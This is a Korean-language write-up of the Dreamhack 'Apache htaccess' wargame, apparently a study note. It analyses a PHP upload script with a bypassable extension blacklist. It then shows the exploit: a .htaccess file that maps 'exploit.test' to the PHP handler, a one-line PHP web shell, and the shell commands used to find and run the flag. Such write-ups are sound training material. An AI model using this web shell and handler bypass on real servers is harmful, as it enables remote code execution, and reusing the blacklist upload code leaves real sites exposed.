# [Dreamhack Wargame] Apache htaccess
* 출처: 🚩 Apache htaccess [🔗](https://dreamhack.io/wargame/challenges/418/)
* Reference: File Vulnerabliity - File Upload Vulnerability
    - ❗️참고: File Vulnerability for Windows: Apache Web Server: 알반 권한으로 임의 코드를 실행하는 방법 [🔗](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Web%20Hacking/File%20Vulnerabilities%20for%20Windows.md#apache-web-server-일반-권한으로-임의-코드를-실행하는-방법)
* 문제 설명
  <br/><br/>
  <img width="1071" alt="Apache htaccess_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/811de14b-5ae5-49e4-b5e7-e9be87b01860">

<br/><br/>

## 문제 파일(upload.php) 및 취약점 분석
```php
<?php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml"); // 필터링할 확장자 리스트

if (isset($_FILES)) {
    $file = $_FILES["file"];
    $error = $file["error"];
    $name = $file["name"];
    $tmp_name = $file["tmp_name"];
   
    if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
    }else {
        $temp = explode(".", $name); // 파일 이름을 "."을 기준으로 분할함
        $extension = end($temp); // 분할한 결과의 마지막 요소(확장자)를 가져옴
       
        if(in_array($extension, $deniedExts)){ // 필터링할 확장자의 목록에 현재 파일의 확장자가 포함되어 있는 경우
            die($extension . " extension file is not allowed to upload ! "); // 업로드 불가능
        }else{ // 필터링할 확장자의 목록에 현재 파일의 확장자가 포함되어 있지 않은 경우
            move_uploaded_file($tmp_name, "upload/" . $name); // 입력받은 파일 이름을 이용해 /upload/ 경로에 파일을 업로드함
            echo "Stored in: <a href='/upload/{$name}'>/upload/{$name}</a>"; // 파일 업로드 위치를 화면에 출력함
        }
    }
}else {
    echo "File is not selected";
}
?>
```
* 문제 파일 분석에 필요한 php 개념
    - ```explode``` 함수: 문자열을 주어진 인자 값을 기준으로 분할하는 함수
        ```php
        explode(string $separator, string $string, int $limit = PHP_INT_MAX): array
        ```
        + 문자열 구분 기호($separator)을 기준으로 문자열($string)을 분할하여 형성된 문자열의 배열을 반환함
        + 참고: 📚 [PHP: explode - Manual](https://www.php.net/manual/en/function.explode.php)
    - ```end``` 함수: 배열의 내부 포인터를 마지막 요소로 설정하는 함수
        ```php
        end(array|object &$array): mixed
        ```
        + 배열의 내부 포인터를 마지막 요소로 이동하고 해당 값을 반환함
        + 참고: 📚 [PHP: end - Manual](https://www.php.net/manual/en/function.end)
* php, php3, php4 등의 확장자를 필터링하고 있지만, 기본값인 .htaccess 파일을 사용해 설정 파일을 관리하고 있음
    - ⚠️ .htaccess 파일은 웹 서버의 권한만 있다면 덮어쓸 수 있음 <br/> &nbsp;&nbsp; → ***.php 확장자 외의 다른 확장자를 PHP 스크립트로 해석하도록 설정을 변경함*** (= 확장자 우회)
        + ```<Files>``` 섹션을 이용한 확장자 우회 (.htaccess 파일에 작성해야 하는 내용)
            ```Apache
            <Files "exploit.test">
              # Apache2 자체 mod_php를 사용함
              SetHandler application/x-httpd-php
            </Files>
            ```
            - 위치와 관계없이 "exploit.test"이란 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 명시된 핸들러가 처리함

<br/><br/>

## 문제 풀이 (익스플로잇)
1. 취약점 분석에서 작성한 .htaccess 파일을 생성하고 업로드함
   <br/><br/>
   <img width="2560" alt="exploit1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/717f3198-852c-406b-9172-7e3a57267145">

<br/>

2. .htaccess 파일에 의해서 exploit.test는 PHP 스크립트로 해석되므로 아래와 같이 exploit.test를 생성하고 이 웹 셸을 업로드하면 해당 파일의 경로가 **/upload/exploit.test**임을 알 수 있음
   <br/><br/>
   <img width="2560" alt="exploit2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/069d3c14-2fa5-4350-992c-687f54a98ab7">
   <br/>
   
   - exploit.test 파일 내용
       ```php
       <?php
         system($_GET['cmd']);
       ?>
       ```

<br/>

3. **/upload/exploit.test**로 접속하여 cmd 파라미터의 값으로 플래그를 획득하기 위한 명령어를 입력함
   <br/><br/>
   <img width="2560" alt="exploit3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/08d05a62-81c5-41bf-b00e-b319c7a883fa">
   <br/>

    1. ```cmd``` 파라미터의 값으로 ```ls -al /```을 입력한 후 요청을 보내 플래그 파일의 위치를 찾음
        +  ```/flag```에 플래그 파일이 존재하며, 실행 권한만 존재하기 때문에 플래그 파일을 실행해야 플래그를 획득할 수 있음을 알 수 있음
    2. 플래그 파일의 실행을 위해 ```cmd``` 파라미터의 값으로 ```/flag```를 입력한 후 요청을 보내면 플래그 파일이 실행되어 플래그를 획득할 수 있음

